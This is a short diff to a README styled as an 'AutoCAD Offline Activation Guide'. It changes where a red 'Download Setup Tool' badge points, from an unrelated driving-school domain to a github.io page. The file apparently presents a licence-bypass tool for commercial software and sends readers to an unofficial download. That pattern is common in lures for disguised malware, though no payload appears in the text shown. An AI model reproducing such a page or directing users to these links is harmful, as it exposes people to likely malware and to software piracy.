@@ -1,6 +1,6 @@
 # 🧮 AutoCAD — Offline Activation Guide
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-red)](https://dalahdrivingschool.com/)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-red)](https://autocad-offline-activation-guide.github.io/.github)
 
 ## 🛠️ How to Install & Activate AutoCAD Offline
 
